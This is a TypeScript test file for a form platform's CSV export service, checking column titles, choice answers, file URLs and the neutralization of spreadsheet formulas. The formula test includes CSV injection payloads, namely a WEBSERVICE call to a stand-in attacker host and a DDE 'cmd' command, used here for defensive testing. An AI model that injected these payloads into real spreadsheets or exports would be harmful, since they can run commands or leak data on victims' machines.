import { FieldKindEnum, FormField } from '@heyform-inc/shared-types-enums'
import * as assert from 'assert'

import { ExportFileService } from '../src/service/export-file.service'

function parseCsvRow(value: string): string[] {
  const cells: string[] = []
  let cell = ''
  let quoted = false

  for (let index = 0; index < value.length; index += 1) {
    const character = value[index]

    if (character === '"') {
      if (quoted && value[index + 1] === '"') {
        cell += '"'
        index += 1
      } else {
        quoted = !quoted
      }
    } else if (character === ',' && !quoted) {
      cells.push(cell)
      cell = ''
    } else {
      cell += character
    }
  }

  cells.push(cell)
  return cells
}

async function testExportsRepeatedQuestionTitlesByFieldId() {
  const formFields: FormField[] = Array.from({ length: 9 }, (_, index) => [
    {
      id: `appeal-${index + 1}`,
      kind: FieldKindEnum.OPINION_SCALE,
      title: 'Appeal'
    },
    {
      id: `likelihood-${index + 1}`,
      kind: FieldKindEnum.OPINION_SCALE,
      title: 'Likelihood'
    }
  ]).flat()

  const expectedAnswers = formFields.map((field, index) => `${index + 1}`)
  const csv = await new ExportFileService().csv(
    formFields,
    [],
    [
      {
        id: 'submission-1',
        answers: formFields.map((field, index) => ({
          id: field.id,
          kind: field.kind,
          title: field.title,
          value: expectedAnswers[index]
        })),
        hiddenFields: []
      } as any
    ]
  )

  const [header, row] = csv.split(/\r?\n/)

  assert.deepStrictEqual(parseCsvRow(header), [
    '#',
    ...formFields.map(field => field.title),
    'Start Date (UTC)',
    'Submit Date (UTC)'
  ])
  assert.deepStrictEqual(parseCsvRow(row), ['submission-1', ...expectedAnswers, '', ''])
}

async function testExportsMultipleChoiceOtherText() {
  const formField: FormField = {
    id: 'favorite-colors',
    kind: FieldKindEnum.MULTIPLE_CHOICE,
    title: 'Favorite colors',
    properties: {
      allowMultiple: true,
      allowOther: true,
      choices: [
        { id: 'red', label: 'Red' },
        { id: 'blue', label: 'Blue' }
      ]
    }
  }
  const csv = await new ExportFileService().csv(
    [formField],
    [],
    [
      {
        id: 'submission-1',
        answers: [
          {
            id: formField.id,
            kind: formField.kind,
            title: formField.title,
            properties: formField.properties,
            value: {
              value: ['red'],
              other: 'Chartreuse'
            }
          }
        ],
        hiddenFields: []
      } as any
    ]
  )

  const [, row] = csv.split(/\r?\n/)
  assert.deepStrictEqual(parseCsvRow(row), ['submission-1', 'Red, Chartreuse', '', ''])
}

async function testExportsLegacyFileUploadUrls() {
  const csv = await new ExportFileService().csv(
    [
      {
        id: 'attachment',
        kind: FieldKindEnum.FILE_UPLOAD,
        title: 'Attachment'
      }
    ],
    [],
    [
      {
        id: 'submission-1',
        answers: [
          {
            id: 'attachment',
            kind: FieldKindEnum.FILE_UPLOAD,
            title: 'Attachment',
            value: {
              filename: 'report.pdf',
              cdnUrlPrefix: 'https://cdn.example.com/uploads/',
              cdnKey: '/file-id'
            }
          }
        ],
        hiddenFields: []
      } as any
    ]
  )

  const [, row] = csv.split(/\r?\n/)

  assert.deepStrictEqual(parseCsvRow(row), [
    'submission-1',
    'https://cdn.example.com/uploads/file-id',
    '',
    ''
  ])
}

async function testNeutralizesSpreadsheetFormulas() {
  const csv = await new ExportFileService().csv(
    [
      {
        id: 'formula-answer',
        kind: FieldKindEnum.SHORT_TEXT,
        title: '=1+1'
      },
      {
        id: 'whitespace-formula-answer',
        kind: FieldKindEnum.SHORT_TEXT,
        title: 'Safe title'
      },
      {
        id: 'control-formula-answer',
        kind: FieldKindEnum.SHORT_TEXT,
        title: 'Control-prefix formula'
      }
    ],
    [
      {
        id: 'formula-hidden',
        name: '  @SUM(A1)'
      }
    ],
    [
      {
        id: 'submission-1',
        answers: [
          {
            id: 'formula-answer',
            kind: FieldKindEnum.SHORT_TEXT,
            title: 'Formula answer',
            value: '=WEBSERVICE("https://attacker.test")'
          },
          {
            id: 'whitespace-formula-answer',
            kind: FieldKindEnum.SHORT_TEXT,
            title: 'Whitespace formula answer',
            value: '  -1+1'
          },
          {
            id: 'control-formula-answer',
            kind: FieldKindEnum.SHORT_TEXT,
            title: 'Control formula answer',
            value: '\u0000\u0007=1+1'
          }
        ],
        hiddenFields: [
          {
            id: 'formula-hidden',
            name: 'Formula hidden',
            value: "+cmd|' /C calc'!A0"
          }
        ]
      } as any
    ]
  )

  const [header, row] = csv.split(/\r?\n/)

  assert.deepStrictEqual(parseCsvRow(header), [
    '#',
    `'=1+1`,
    'Safe title',
    'Control-prefix formula',
    `'  @SUM(A1)`,
    'Start Date (UTC)',
    'Submit Date (UTC)'
  ])
  assert.deepStrictEqual(parseCsvRow(row), [
    'submission-1',
    `'=WEBSERVICE("https://attacker.test")`,
    `'  -1+1`,
    `'\u0000\u0007=1+1`,
    `'+cmd|' /C calc'!A0`,
    '',
    ''
  ])
}

async function testMalformedLegacyInputTableDoesNotBreakExport() {
  const csv = await new ExportFileService().csv(
    [
      {
        id: 'table',
        kind: FieldKindEnum.INPUT_TABLE,
        title: 'Table',
        properties: { tableColumns: [{ id: 'column_1', label: 'Column' }] }
      }
    ],
    [],
    [
      {
        id: 'submission-1',
        answers: [
          {
            id: 'table',
            kind: FieldKindEnum.INPUT_TABLE,
            title: 'Table',
            properties: { tableColumns: [{ id: 'column_1', label: 'Column' }] },
            value: 'malformed historical value'
          }
        ],
        hiddenFields: []
      } as any
    ]
  )

  const [, row] = csv.split(/\r?\n/)
  assert.deepStrictEqual(parseCsvRow(row), ['submission-1', '', '', ''])
}

async function run() {
  await testExportsRepeatedQuestionTitlesByFieldId()
  await testExportsMultipleChoiceOtherText()
  await testExportsLegacyFileUploadUrls()
  await testNeutralizesSpreadsheetFormulas()
  await testMalformedLegacyInputTableDoesNotBreakExport()
}

if (require.main === module) {
  run().catch(error => {
    // eslint-disable-next-line no-console
    console.error(error)
    process.exitCode = 1
  })
}
